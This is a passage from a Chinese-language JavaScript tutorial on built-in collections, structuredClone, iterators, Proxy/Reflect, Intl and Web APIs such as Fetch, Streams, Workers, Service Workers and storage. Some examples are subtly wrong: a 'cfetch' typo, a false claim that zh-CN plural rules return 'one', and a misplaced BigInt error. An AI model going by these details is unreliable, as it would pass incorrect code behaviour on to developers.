  typeof v === 'bigint' ? v.toString() + 'n' : v
);
```

---

### 2.2 集合类型

#### 2.2.1 Map vs Object 性能对比

```javascript
// 性能测试：100万次操作
const iterations = 1000000;

// Object 作为字典
console.time('Object-set');
const obj = {};
for (let i = 0; i < iterations; i++) {
  obj[`key${i}`] = i;
}
console.timeEnd('Object-set');

// Map
console.time('Map-set');
const map = new Map();
for (let i = 0; i < iterations; i++) {
  map.set(`key${i}`, i);
}
console.timeEnd('Map-set');

// 结果（V8）：
// Object-set: ~50ms
// Map-set: ~80ms（但 key 可以是任意类型）

// 任意类型 key 的优势
const objKey = { id: 1 };
const map2 = new Map();
map2.set(objKey, 'value');
console.log(map2.get(objKey));  // 'value'

// Object 只能用字符串/Symbol 作为 key
const obj2 = {};
obj2[objKey] = 'value';  // key 被转换为 '[object Object]'
```

**Map 迭代顺序保证**：

```javascript
const map = new Map();
map.set('z', 1);
map.set('a', 2);
map.set('m', 3);

// 插入顺序保证
for (const [k, v] of map) {
  console.log(k, v);  // z 1, a 2, m 3
}

// Object 的 key 顺序（ES2015+）：
// 1. 整数索引（按数值排序）
// 2. 字符串 key（按插入顺序）
// 3. Symbol key（按插入顺序）
```

#### 2.2.2 Set 去重与集合运算

```javascript
// 高效去重
const arr = [1, 2, 2, 3, 3, 3];
const unique = [...new Set(arr)];  // [1, 2, 3]

// 集合运算
class ExtendedSet extends Set {
  union(other) {
    return new ExtendedSet([...this, ...other]);
  }

  intersection(other) {
    return new ExtendedSet([...this].filter(x => other.has(x)));
  }

  difference(other) {
    return new ExtendedSet([...this].filter(x => !other.has(x)));
  }

  symmetricDifference(other) {
    return this.union(other).difference(this.intersection(other));
  }
}

// 使用
const a = new ExtendedSet([1, 2, 3]);
const b = new ExtendedSet([2, 3, 4]);

console.log([...a.intersection(b)]);  // [2, 3]
console.log([...a.difference(b)]);    // [1]
```

#### 2.2.3 WeakMap / WeakSet - 弱引用集合

**垃圾回收语义**：

```
形式化定义：
- 设 O 为对象集合
- 设 WeakMap M: O → values
- 设 reachability(O) 表示对象是否可从根到达

垃圾回收不变式：
∀o ∈ O, ¬reachability(o) ⟹ M.get(o) 可被回收

即：WeakMap 的 key 不阻止垃圾回收
```

```javascript
// 私有属性实现（WeakMap 模式）
const privateData = new WeakMap();

class Counter {
  constructor() {
    privateData.set(this, { count: 0 });
  }

  increment() {
    const data = privateData.get(this);
    data.count++;
    return data.count;
  }

  get count() {
    return privateData.get(this).count;
  }
}

// 当 Counter 实例被回收，privateData 中的条目自动消失
// 不会导致内存泄漏

// ❌ 对比：使用闭包（每个实例创建新函数）
function createCounter() {
  let count = 0;  // 闭包变量
  return {
    increment: () => ++count,
    getCount: () => count
  };
}

// ✅ WeakMap（共享方法，更省内存）
```

**WeakRef 和 FinalizationRegistry**：

```javascript
// WeakRef - 弱引用对象
const ref = new WeakRef({ data: 'important' });

// 获取对象（可能返回 undefined）
const obj = ref.deref();
if (obj) {
  console.log(obj.data);
}

// FinalizationRegistry - 对象被回收时回调
const registry = new FinalizationRegistry((heldValue) => {
  console.log(`Object with ${heldValue} was garbage collected`);
});

let obj2 = { id: 123 };
registry.register(obj2, 'resource-id-123');

obj2 = null;  // 解除引用
// 稍后：'Object with resource-id-123 was garbage collected'
```

---

### 2.3 结构化克隆

#### 2.3.1 structuredClone 深度解析

**支持类型矩阵**：

| 类型 | 支持 | 说明 |
|------|------|------|
| 原始类型 | ✅ | null, undefined, boolean, number, string, bigint, symbol |
| Object | ✅ | 普通对象 |
| Array | ✅ | |
| Date | ✅ | |
| RegExp | ✅ | 包括 lastIndex |
| Map | ✅ | |
| Set | ✅ | |
| ArrayBuffer | ✅ | |
| TypedArray | ✅ | |
| DataView | ✅ | |
| Error | ✅ | 包括自定义错误 |
| 循环引用 | ✅ | 自动处理 |
| Function | ❌ | 抛出 DataCloneError |
| DOM 节点 | ❌ | 抛出 DataCloneError |
| 原型链 | ❌ | 克隆为普通对象 |

```javascript
// 基本用法
const original = {
  name: 'Alice',
  date: new Date(),
  map: new Map([['key', 'value']]),
  nested: { a: 1 }
};

const cloned = structuredClone(original);

// 验证深拷贝
console.log(cloned === original);           // false
console.log(cloned.nested === original.nested);  // false
console.log(cloned.date === original.date);      // false

// 循环引用处理
const circular = { name: 'root' };
circular.self = circular;

const clonedCircular = structuredClone(circular);
console.log(clonedCircular.self === clonedCircular);  // true

// 带转移（transfer）的克隆
const buffer = new ArrayBuffer(1024);
const withBuffer = { data: buffer };

const cloned2 = structuredClone(withBuffer, {
  transfer: [buffer]  // buffer 所有权转移给克隆对象
});

console.log(buffer.byteLength);  // 0（原 buffer 被清空）
console.log(cloned2.data.byteLength);  // 1024
```

**与 JSON 方法对比**：

```javascript
const data = {
  date: new Date(),
  map: new Map([['a', 1]]),
  undefined: undefined,
  fn: () => {},
  bigint: 123n
};

// JSON 方法的问题
const jsonCopy = JSON.parse(JSON.stringify(data));
console.log(jsonCopy.date);      // 字符串，不是 Date
console.log(jsonCopy.map);       // {}，不是 Map
console.log(jsonCopy.undefined); // 缺失
console.log(jsonCopy.bigint);    // 报错

// structuredClone 正确保留类型
const clone = structuredClone(data);
console.log(clone.date instanceof Date);  // true
console.log(clone.map instanceof Map);    // true
```

---

### 2.4 迭代器协议

#### 2.4.1 Iterator Protocol 形式化

```typescript
// 迭代器协议
interface Iterator<T> {
  next(): IteratorResult<T>;
  return?(value?: any): IteratorResult<T>;
  throw?(e?: any): IteratorResult<T>;
}

interface IteratorResult<T> {
  value: T;
  done: boolean;
}

// 可迭代协议
interface Iterable<T> {
  [Symbol.iterator](): Iterator<T>;
}

// 异步迭代器
interface AsyncIterator<T> {
  next(): Promise<IteratorResult<T>>;
}

interface AsyncIterable<T> {
  [Symbol.asyncIterator](): AsyncIterator<T>;
}
```

#### 2.4.2 Generator 函数

```javascript
// 生成器函数
function* fibonacci() {
  let [a, b] = [0, 1];
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

// 使用
const fib = fibonacci();
console.log(fib.next().value);  // 0
console.log(fib.next().value);  // 1
console.log(fib.next().value);  // 1
console.log(fib.next().value);  // 2

// 双向通信
function* twoWay() {
  const received = yield 'sent';  // 发送 'sent'，接收外部值
  yield `received: ${received}`;
}

const gen = twoWay();
console.log(gen.next().value);        // 'sent'
console.log(gen.next('hello').value); // 'received: hello'

// 提前终止
function* withCleanup() {
  try {
    yield 1;
    yield 2;
    yield 3;
  } finally {
    console.log('cleanup');  // 一定会执行
  }
}

const gen2 = withCleanup();
console.log(gen2.next().value);  // 1
console.log(gen2.return('end')); // { value: 'end', done: true }
// 输出: cleanup
```

#### 2.4.3 异步迭代器

```javascript
// 异步生成器
async function* asyncRange(start, end, delay) {
  for (let i = start; i <= end; i++) {
    await new Promise(resolve => setTimeout(resolve, delay));
    yield i;
  }
}

// 使用
(async () => {
  for await (const num of asyncRange(1, 5, 100)) {
    console.log(num);  // 每 100ms 输出一个数字
  }
})();

// 并发控制
async function* fetchPages(urls, concurrency = 3) {
  const queue = [...urls];
  const executing = new Set();

  while (queue.length > 0 || executing.size > 0) {
    // 填充并发槽
    while (executing.size < concurrency && queue.length > 0) {
      const url = queue.shift();
      const promise = fetch(url)
        .then(r => r.json())
        .finally(() => executing.delete(promise));
      executing.add(promise);
      yield promise;
    }

    // 等待任意一个完成
    if (executing.size > 0) {
      await Promise.race(executing);
    }
  }
}

// 使用
const urls = ['/api/1', '/api/2', '/api/3', '/api/4', '/api/5'];
for await (const data of fetchPages(urls, 2)) {
  console.log(data);
}
```

---

### 2.5 反射与代理

#### 2.5.1 Reflect API

```javascript
// Reflect 与直接操作对比
const obj = {};

// 直接操作
obj.a = 1;
delete obj.a;
'a' in obj;
Object.getOwnPropertyDescriptor(obj, 'a');

// Reflect 操作（函数式，返回布尔值表示成功/失败）
Reflect.set(obj, 'a', 1);        // true
Reflect.deleteProperty(obj, 'a'); // true
Reflect.has(obj, 'a');           // false
Reflect.getOwnPropertyDescriptor(obj, 'a');

// 关键区别：Reflect 与 Proxy 配合使用
const proxy = new Proxy(obj, {
  set(target, prop, value) {
    // 使用 Reflect 确保正确的 this 绑定
    return Reflect.set(target, prop, value);
  }
});
```

#### 2.5.2 Proxy 陷阱完整列表

```javascript
const handler = {
  // 属性读取
  get(target, prop, receiver) {
    console.log(`Getting ${String(prop)}`);
    return Reflect.get(target, prop, receiver);
  },

  // 属性设置
  set(target, prop, value, receiver) {
    console.log(`Setting ${String(prop)} = ${value}`);
    return Reflect.set(target, prop, value, receiver);
  },

  // 属性删除
  deleteProperty(target, prop) {
    console.log(`Deleting ${String(prop)}`);
    return Reflect.deleteProperty(target, prop);
  },

  // in 操作符
  has(target, prop) {
    console.log(`Checking has ${String(prop)}`);
    return Reflect.has(target, prop);
  },

  // Object.keys 等
  ownKeys(target) {
    console.log('Getting own keys');
    return Reflect.ownKeys(target);
  },

  // 获取属性描述符
  getOwnPropertyDescriptor(target, prop) {
    console.log(`Getting descriptor for ${String(prop)}`);
    return Reflect.getOwnPropertyDescriptor(target, prop);
  },

  // 定义属性
  defineProperty(target, prop, descriptor) {
    console.log(`Defining ${String(prop)}`);
    return Reflect.defineProperty(target, prop, descriptor);
  },

  // 原型相关
  getPrototypeOf(target) {
    return Reflect.getPrototypeOf(target);
  },

  setPrototypeOf(target, proto) {
    return Reflect.setPrototypeOf(target, proto);
  },

  // 阻止扩展
  preventExtensions(target) {
    return Reflect.preventExtensions(target);
  },

  // 是否可扩展
  isExtensible(target) {
    return Reflect.isExtensible(target);
  },

  // 函数调用
  apply(target, thisArg, args) {
    console.log(`Calling with args: ${args}`);
    return Reflect.apply(target, thisArg, args);
  },

  // new 操作
  construct(target, args, newTarget) {
    console.log(`Constructing with args: ${args}`);
    return Reflect.construct(target, args, newTarget);
  }
};

const proxy = new Proxy(function() {}, handler);
```

#### 2.5.3 实际应用模式

```javascript
// 1. 验证代理
function createValidator(target, schema) {
  return new Proxy(target, {
    set(target, prop, value) {
      if (schema[prop]) {
        const valid = schema[prop](value);
        if (!valid) {
          throw new TypeError(`Invalid value for ${String(prop)}: ${value}`);
        }
      }
      return Reflect.set(target, prop, value);
    }
  });
}

const user = createValidator({}, {
  name: v => typeof v === 'string' && v.length > 0,
  age: v => typeof v === 'number' && v >= 0 && v <= 150
});

user.name = 'Alice';  // ✅
// user.age = 200;    // ❌ TypeError

// 2. 私有属性代理
const privateFields = new WeakMap();

function withPrivateFields(classDef) {
  return new Proxy(classDef, {
    construct(target, args) {
      const instance = Reflect.construct(target, args);
      privateFields.set(instance, {});
      return new Proxy(instance, {
        get(target, prop) {
          if (typeof prop === 'string' && prop.startsWith('_')) {
            return privateFields.get(target)[prop];
          }
          return Reflect.get(target, prop);
        },
        set(target, prop, value) {
          if (typeof prop === 'string' && prop.startsWith('_')) {
            privateFields.get(target)[prop] = value;
            return true;
          }
          return Reflect.set(target, prop, value);
        }
      });
    }
  });
}

// 3. 撤销代理
const { proxy: revocableProxy, revoke } = Proxy.revocable({ data: 'secret' }, {
  get(target, prop) {
    return target[prop];
  }
});

console.log(revocableProxy.data);  // 'secret'
revoke();
// console.log(revocableProxy.data);  // TypeError: Cannot perform 'get' on a proxy that has been revoked
```

---

### 2.6 国际化 API (Intl)

#### 2.6.1 Intl 完整生态

```javascript
// 1. 日期时间格式化
const date = new Date('2024-01-15T14:30:00');

const dtf = new Intl.DateTimeFormat('zh-CN', {
  year: 'numeric',
  month: 'long',
  day: 'numeric',
  weekday: 'long',
  hour: '2-digit',
  minute: '2-digit',
  timeZone: 'Asia/Shanghai'
});

console.log(dtf.format(date));  // '2024年1月15日星期一 14:30'

// 2. 数字格式化
const nf = new Intl.NumberFormat('zh-CN', {
  style: 'currency',
  currency: 'CNY',
  minimumFractionDigits: 2
});

console.log(nf.format(1234567.89));  // '¥1,234,567.89'

// 3. 相对时间
const rtf = new Intl.RelativeTimeFormat('zh-CN', { numeric: 'auto' });
console.log(rtf.format(-1, 'day'));    // '昨天'
console.log(rtf.format(3, 'month'));   // '3个月后'

// 4. 列表格式化
const lf = new Intl.ListFormat('zh-CN', { style: 'long', type: 'conjunction' });
console.log(lf.format(['苹果', '香蕉', '橙子']));  // '苹果、香蕉和橙子'

// 5. 复数规则
const pr = new Intl.PluralRules('zh-CN');
console.log(pr.select(0));   // 'other'
console.log(pr.select(1));   // 'one'

// 6. 区域敏感排序
const collator = new Intl.Collator('zh-CN', { sensitivity: 'base' });
['一', '二', '三'].sort(collator.compare);  // 按拼音排序

// 7. 分段器（Segmenter）
const segmenter = new Intl.Segmenter('zh-CN', { granularity: 'word' });
const segments = segmenter.segment('这是一个测试');
for (const { segment, isWordLike } of segments) {
  console.log(segment, isWordLike);
}
// '这' true, '是' true, '一个' true, '测试' true

// 8. 显示名称
const dn = new Intl.DisplayNames('zh-CN', { type: 'language' });
console.log(dn.of('en-US'));  // '英语（美国）'
```

#### 2.6.2 性能优化：复用 Intl 实例

```javascript
// ❌ 低效：每次创建新实例
function formatPrices(prices) {
  return prices.map(price =>
    new Intl.NumberFormat('zh-CN', { style: 'currency', currency: 'CNY' })
      .format(price)
  );
}

// ✅ 高效：复用实例
const priceFormatter = new Intl.NumberFormat('zh-CN', {
  style: 'currency',
  currency: 'CNY'
});

function formatPricesOptimized(prices) {
  return prices.map(price => priceFormatter.format(price));
}

// 性能对比
const prices = Array(10000).fill(0).map((_, i) => i * 1.99);

console.time('new-each-time');
formatPrices(prices);
console.timeEnd('new-each-time');  // ~500ms

console.time('reuse');
formatPricesOptimized(prices);
console.timeEnd('reuse');  // ~50ms
```

---


## 3. Web APIs 标准库

### 3.1 Fetch API

#### 3.1.1 完整请求生命周期

```
┌─────────────────────────────────────────────────────────────────────┐
│                        Fetch Request Lifecycle                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Request Construction                                             │
│     ↓ new Request(url, options)                                      │
│                                                                      │
│  2. CORS Preflight (if needed)                                       │
│     ↓ OPTIONS 请求（复杂跨域请求）                                    │
│                                                                      │
│  3. Network Request                                                  │
│     ↓ HTTP/1.1 或 HTTP/2 连接                                        │
│                                                                      │
│  4. Response Streaming                                               │
│     ↓ 响应体作为 ReadableStream                                      │
│                                                                      │
│  5. Body Consumption                                                 │
│     ↓ .json() / .text() / .blob() / .arrayBuffer()                   │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### 3.1.2 高级用法与陷阱

```javascript
// 1. 请求取消（AbortController）
const controller = new AbortController();
const { signal } = controller;

// 5秒后自动取消
setTimeout(() => controller.abort(), 5000);

try {
  const response = await fetch('/api/data', { signal });
  const data = await response.json();
} catch (error) {
  if (error.name === 'AbortError') {
    console.log('Request was aborted');
  }
}

// 2. 进度跟踪（需要 ReadableStream）
async function fetchWithProgress(url, onProgress) {
  const response = await fetch(url);
  const contentLength = +response.headers.get('Content-Length');

  const reader = response.body.getReader();
  let received = 0;
  const chunks = [];

  while (true) {
    const { done, value } = await reader.read();
    if (done) break;

    chunks.push(value);
    received += value.length;
    onProgress(received, contentLength);
  }

  // 合并 chunks
  const body = new Uint8Array(received);
  let position = 0;
  for (const chunk of chunks) {
    body.set(chunk, position);
    position += chunk.length;
  }

  return body;
}

// 3. 超时封装
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);

  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    clearTimeout(id);
    return response;
  } catch (error) {
    clearTimeout(id);
    throw error;
  }
}

// 4. 请求/响应拦截器模式
class FetchClient {
  constructor() {
    this.requestInterceptors = [];
    this.responseInterceptors = [];
  }

  addRequestInterceptor(fn) {
    this.requestInterceptors.push(fn);
  }

  addResponseInterceptor(fn) {
    this.responseInterceptors.push(fn);
  }

  async fetch(url, options = {}) {
    // 请求拦截
    let request = new Request(url, options);
    for (const interceptor of this.requestInterceptors) {
      request = await interceptor(request) || request;
    }

    // 执行请求
    let response = await fetch(request);

    // 响应拦截
    for (const interceptor of this.responseInterceptors) {
      response = await interceptor(response) || response;
    }

    return response;
  }
}

// 使用
const client = new FetchClient();
client.addRequestInterceptor(req => {
  req.headers.set('Authorization', `Bearer ${getToken()}`);
  return req;
});
client.addResponseInterceptor(async res => {
  if (res.status === 401) {
    await refreshToken();
    // 重试原请求...
  }
  return res;
});
```

#### 3.1.3 常见陷阱

```javascript
// ❌ 陷阱 1：响应体只能读取一次
const response = await fetch('/api/data');
const json1 = await response.json();  // ✅
const json2 = await response.json();  // ❌ TypeError: body already read

// ✅ 解决方案：克隆响应
const response2 = await fetch('/api/data');
const clone1 = response2.clone();
const clone2 = response2.clone();
await clone1.json();
await clone2.text();  // ✅

// ❌ 陷阱 2：fetch 不将 4xx/5xx 视为错误
const response = await fetch('/api/not-found');
console.log(response.ok);     // false
console.log(response.status); // 404
// 不会抛出错误！

// ✅ 正确做法
if (!response.ok) {
  throw new Error(`HTTP ${response.status}: ${response.statusText}`);
}

// ❌ 陷阱 3：Cookie 默认不跨域发送
fetch('https://api.example.com/data');  // 不发送 Cookie

// ✅ 正确配置
cfetch('https://api.example.com/data', {
  credentials: 'include'  // 发送 Cookie
});

// ❌ 陷阱 4：GET 请求不能有 body
fetch('/api/data', {
  method: 'GET',
  body: JSON.stringify({})  // ❌ TypeError
});
```

---

### 3.2 Streams API

#### 3.2.1 流架构模型

```
┌─────────────────────────────────────────────────────────────────────┐
│                        Streams Architecture                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ReadableStream (源)                                                │
│  ├── getReader() → ReadableStreamDefaultReader                      │
│  ├── pipeTo(WritableStream)                                          │
│  ├── pipeThrough(TransformStream)                                    │
│  └── tee() → [ReadableStream, ReadableStream]                       │
│                                                                      │
│  WritableStream (汇)                                                │
│  ├── getWriter() → WritableStreamDefaultWriter                      │
│  ├── write(chunk)                                                    │
│  ├── close()                                                         │
│  └── abort(reason)                                                   │
│                                                                      │
│  TransformStream (转换)                                             │
│  ├── readable → ReadableStream                                      │
│  └── writable → WritableStream                                      │
│                                                                      │
│  Byte Streams (原始字节)                                            │
│  └── ReadableStreamBYOBReader (Bring Your Own Buffer)               │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### 3.2.2 完整示例

```javascript
// 1. 创建自定义 ReadableStream
const readable = new ReadableStream({
  start(controller) {
    // 初始化
    this.count = 0;
  },

  pull(controller) {
    // 消费者请求更多数据时调用
    if (this.count < 5) {
      controller.enqueue(`Chunk ${this.count}`);
      this.count++;
    } else {
      controller.close();  // 结束流
    }
  },

  cancel(reason) {
    // 消费者取消时调用
    console.log('Cancelled:', reason);
  }
});

// 消费
const reader = readable.getReader();
while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  console.log(value);
}

// 2. 创建自定义 TransformStream
const transform = new TransformStream({
  start(controller) {
    this.buffer = '';
  },

  transform(chunk, controller) {
    // 转换数据
    this.buffer += chunk;
    const lines = this.buffer.split('\n');
    this.buffer = lines.pop();  // 保留不完整的行

    for (const line of lines) {
      controller.enqueue(JSON.parse(line));
    }
  },

  flush(controller) {
    // 流结束时处理剩余数据
    if (this.buffer) {
      controller.enqueue(JSON.parse(this.buffer));
    }
  }
});

// 3. 创建自定义 WritableStream
const writable = new WritableStream({
  start(controller) {
    this.chunks = [];
  },

  write(chunk, controller) {
    this.chunks.push(chunk);
  },

  close() {
    console.log('Total chunks:', this.chunks.length);
  },

  abort(reason) {
    console.log('Aborted:', reason);
  }
});

// 4. 管道组合
fetch('/api/large-data')
  .then(res => res.body)
  .then(body => body
    .pipeThrough(new TextDecoderStream())  // 字节 → 文本
    .pipeThrough(new TransformStream({     // 自定义处理
      transform(chunk, controller) {
        controller.enqueue(chunk.toUpperCase());
      }
    }))
    .pipeTo(writable)
  );

// 5. 背压处理（Backpressure）
const slowWritable = new WritableStream({
  async write(chunk) {
    // 模拟慢速消费
    await new Promise(resolve => setTimeout(resolve, 100));
    console.log('Processed:', chunk);
  }
}, {
  // 高水位线：控制缓冲区大小
  highWaterMark: 3
});

// 当缓冲区满时，ReadableStream 会自动暂停
```

#### 3.2.3 性能对比

```javascript
// 场景：处理 100MB 数据

// ❌ 传统方式：全部加载到内存
console.time('buffer');
const response = await fetch('/large-file');
const buffer = await response.arrayBuffer();  // 100MB 内存
process(buffer);
console.timeEnd('buffer');

// ✅ 流式处理：固定内存占用
console.time('stream');
const response2 = await fetch('/large-file');
const reader = response2.body.getReader();
while (true) {
  const { done, value } = await reader.read();  // 每次 16KB
  if (done) break;
  processChunk(value);  // 即时处理
}
console.timeEnd('stream');

// 内存占用对比：
// buffer: 100MB + 处理开销
// stream: 16KB（缓冲区）+ 处理开销
```

---

### 3.3 Web Workers

#### 3.3.1 Worker 类型对比

| 类型 | 创建方式 | 用途 | 限制 |
|------|----------|------|------|
| Dedicated Worker | `new Worker('worker.js')` | 单页面后台任务 | 无法访问 DOM |
| Shared Worker | `new SharedWorker('worker.js')` | 多页面共享 | 端口通信 |
| Service Worker | `navigator.serviceWorker.register()` | 离线缓存、推送 | HTTPS 必需 |
| Worklet | `CSS.paintWorklet.addModule()` | 渲染管道扩展 | 特定 API |

#### 3.3.2 Dedicated Worker 完整示例

```javascript
// main.js - 主线程
const worker = new Worker('worker.js', { type: 'module' });

// 发送消息
worker.postMessage({
  type: 'COMPUTE',
  data: { n: 40 }
}, [transferableBuffer]);  // 转移所有权

// 接收消息
worker.onmessage = (e) => {
  console.log('Result:', e.data.result);
};

worker.onerror = (err) => {
  console.error('Worker error:', err);
};

// 终止 Worker
worker.terminate();

// worker.js - Worker 线程
self.onmessage = async (e) => {
  const { type, data } = e.data;

  switch (type) {
    case 'COMPUTE':
      const result = heavyComputation(data.n);
      self.postMessage({ result });
      break;

    case 'FETCH':
      const response = await fetch(data.url);
      const json = await response.json();
      self.postMessage({ data: json });
      break;
  }
};

function heavyComputation(n) {
  // 斐波那契数列（递归，计算密集型）
  if (n <= 1) return n;
  return heavyComputation(n - 1) + heavyComputation(n - 2);
}
```

#### 3.3.3 线程池实现

```javascript
// thread-pool.js
class WorkerPool {
  constructor(workerScript, poolSize = navigator.hardwareConcurrency) {
    this.workerScript = workerScript;
    this.poolSize = poolSize;
    this.workers = [];
    this.queue = [];
    this.taskId = 0;
    this.pendingTasks = new Map();

    // 初始化 Worker
    for (let i = 0; i < poolSize; i++) {
      this.addWorker();
    }
  }

  addWorker() {
    const worker = new Worker(this.workerScript, { type: 'module' });
    worker.isBusy = false;

    worker.onmessage = (e) => {
      const { taskId, result, error } = e.data;
      const task = this.pendingTasks.get(taskId);

      if (error) {
        task.reject(new Error(error));
      } else {
        task.resolve(result);
      }

      this.pendingTasks.delete(taskId);
      worker.isBusy = false;
      this.processQueue();
    };

    this.workers.push(worker);
  }

  execute(data, transferList) {
    return new Promise((resolve, reject) => {
      const taskId = ++this.taskId;
      this.pendingTasks.set(taskId, { resolve, reject });

      this.queue.push({ taskId, data, transferList });
      this.processQueue();
    });
  }

  processQueue() {
    if (this.queue.length === 0) return;

    const availableWorker = this.workers.find(w => !w.isBusy);
    if (!availableWorker) return;

    const task = this.queue.shift();
    availableWorker.isBusy = true;
    availableWorker.postMessage(
      { taskId: task.taskId, data: task.data },
      task.transferList
    );

    // 继续处理队列
    this.processQueue();
  }

  terminate() {
    this.workers.forEach(w => w.terminate());
    this.workers = [];
    this.queue = [];
    this.pendingTasks.forEach(task =>
      task.reject(new Error('Pool terminated'))
    );
    this.pendingTasks.clear();
  }
}

// 使用
const pool = new WorkerPool('compute-worker.js', 4);

// 并行执行多个任务
const results = await Promise.all([
  pool.execute({ n: 35 }),
  pool.execute({ n: 36 }),
  pool.execute({ n: 37 }),
  pool.execute({ n: 38 })
]);

pool.terminate();
```

#### 3.3.4 Shared Worker

```javascript
// shared-worker.js
const connections = new Set();

self.onconnect = (e) => {
  const port = e.ports[0];
  connections.add(port);

  port.onmessage = (e) => {
    // 广播给所有连接
    connections.forEach(conn => {
      if (conn !== port) {
        conn.postMessage(e.data);
      }
    });
  };

  port.onmessageerror = () => {
    connections.delete(port);
  };

  port.start();
};

// tab1.js
const sharedWorker = new SharedWorker('shared-worker.js');
sharedWorker.port.postMessage({ from: 'tab1', message: 'Hello' });

// tab2.js
const sharedWorker2 = new SharedWorker('shared-worker.js');
sharedWorker2.port.onmessage = (e) => {
  console.log('Received from other tab:', e.data);
};
```

---

### 3.4 Service Workers

#### 3.4.1 生命周期

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Service Worker Lifecycle                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Registration                                                     │
│     navigator.serviceWorker.register('/sw.js')                       │
│     ↓                                                                │
│  2. Download & Parse                                                 │
│     下载脚本，解析并执行                                              │
│     ↓                                                                │
│  3. Install                                                          │
│     install 事件 → 缓存静态资源                                       │
│     ↓                                                                │
│  4. Waiting                                                          │
│     等待旧版本 SW 控制的所有页面关闭                                   │
│     ↓ skipWaiting()                                                  │
│  5. Activate                                                         │
│     activate 事件 → 清理旧缓存                                        │
│     ↓                                                                │
│  6. Idle / Fetch / Message                                           │
│     处理网络请求和消息                                                │
│     ↓                                                                │
│  7. Update Check                                                     │
│     定期检查更新（页面导航时）                                         │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### 3.4.2 完整 Service Worker 实现

```javascript
// sw.js - Service Worker
const CACHE_NAME = 'app-v1';
const STATIC_ASSETS = [
  '/',
  '/index.html',
  '/styles.css',
  '/app.js',
  '/icon.png'
];

// 安装：缓存静态资源
self.addEventListener('install', (e) => {
  e.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => cache.addAll(STATIC_ASSETS))
      .then(() => self.skipWaiting())  // 立即激活
  );
});

// 激活：清理旧缓存
self.addEventListener('activate', (e) => {
  e.waitUntil(
    caches.keys()
      .then(cacheNames => {
        return Promise.all(
          cacheNames
            .filter(name => name !== CACHE_NAME)
            .map(name => caches.delete(name))
        );
      })
      .then(() => self.clients.claim())  // 立即控制页面
  );
});

// 拦截请求
self.addEventListener('fetch', (e) => {
  const { request } = e;

  // 策略 1：缓存优先（静态资源）
  if (isStaticAsset(request)) {
    e.respondWith(cacheFirst(request));
    return;
  }

  // 策略 2：网络优先（API 请求）
  if (isAPIRequest(request)) {
    e.respondWith(networkFirst(request));
    return;
  }

  // 策略 3：仅网络
  e.respondWith(fetch(request));
});

// 缓存优先策略
async function cacheFirst(request) {
  const cache = await caches.open(CACHE_NAME);
  const cached = await cache.match(request);

  if (cached) {
    // 后台更新缓存
    fetch(request).then(response => {
      cache.put(request, response.clone());
    });
    return cached;
  }

  const response = await fetch(request);
  cache.put(request, response.clone());
  return response;
}

// 网络优先策略
async function networkFirst(request) {
  const cache = await caches.open(CACHE_NAME);

  try {
    const networkResponse = await fetch(request);
    cache.put(request, networkResponse.clone());
    return networkResponse;
  } catch (error) {
    const cached = await cache.match(request);
    if (cached) return cached;
    throw error;
  }
}

// 后台同步
self.addEventListener('sync', (e) => {
  if (e.tag === 'sync-data') {
    e.waitUntil(syncPendingData());
  }
});

// 推送通知
self.addEventListener('push', (e) => {
  const data = e.data.json();
  e.waitUntil(
    self.registration.showNotification(data.title, {
      body: data.body,
      icon: '/icon.png',
      data: data.url
    })
  );
});

// 通知点击
self.addEventListener('notificationclick', (e) => {
  e.notification.close();
  e.waitUntil(
    clients.openWindow(e.notification.data)
  );
});
```

#### 3.4.3 注册与通信

```javascript
// main.js - 主线程
async function registerSW() {
  if (!('serviceWorker' in navigator)) {
    console.log('Service Worker not supported');
    return;
  }

  try {
    const registration = await navigator.serviceWorker.register('/sw.js', {
      scope: '/'
    });

    // 监听更新
    registration.addEventListener('updatefound', () => {
      const newWorker = registration.installing;
      newWorker.addEventListener('statechange', () => {
        if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
          // 新版本可用
          showUpdateNotification(newWorker);
        }
      });
    });

  } catch (error) {
    console.error('SW registration failed:', error);
  }
}

// 与 Service Worker 通信
async function sendMessageToSW(message) {
  const registration = await navigator.serviceWorker.ready;

  return new Promise((resolve) => {
    const channel = new MessageChannel();
    channel.port1.onmessage = (e) => resolve(e.data);

    registration.active.postMessage(message, [channel.port2]);
  });
}

// 后台同步
async function scheduleSync() {
  const registration = await navigator.serviceWorker.ready;
  await registration.sync.register('sync-data');
}
```

---

### 3.5 Storage APIs

#### 3.5.1 存储类型对比

| 特性 | localStorage | sessionStorage | IndexedDB | Cache API |
|------|--------------|----------------|-----------|-----------|
| 容量 | ~5-10MB | ~5-10MB | 较大（浏览器决定） | 较大 |
| 持久性 | 永久 | 会话级 | 永久 | 永久 |
| 同步/异步 | 同步 | 同步 | 异步 | 异步 |
| 数据类型 | 字符串 | 字符串 | 结构化数据 | Request/Response |
| 作用域 | 同源 | 同源标签页 | 同源 | Service Worker |
| 索引 | ❌ | ❌ | ✅ | ❌ |

#### 3.5.2 localStorage / sessionStorage

```javascript
// 基本操作
localStorage.setItem('key', 'value');
const value = localStorage.getItem('key');
localStorage.removeItem('key');
localStorage.clear();

// 存储对象（需要序列化）
const user = { name: 'Alice', age: 30 };
localStorage.setItem('user', JSON.stringify(user));
const saved = JSON.parse(localStorage.getItem('user'));

// 性能陷阱：同步阻塞
// ❌ 大量数据操作会阻塞主线程
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`key${i}`, 'large data...');
}

// ✅ 批量操作使用单个键
const data = {};
for (let i = 0; i < 10000; i++) {
  data[`key${i}`] = 'large data...';
}
localStorage.setItem('batch', JSON.stringify(data));

// 存储事件（跨标签页同步）
window.addEventListener('storage', (e) => {
  console.log('Key changed:', e.key);
  console.log('Old value:', e.oldValue);
  console.log('New value:', e.newValue);
  console.log('Source:', e.url);
});
```

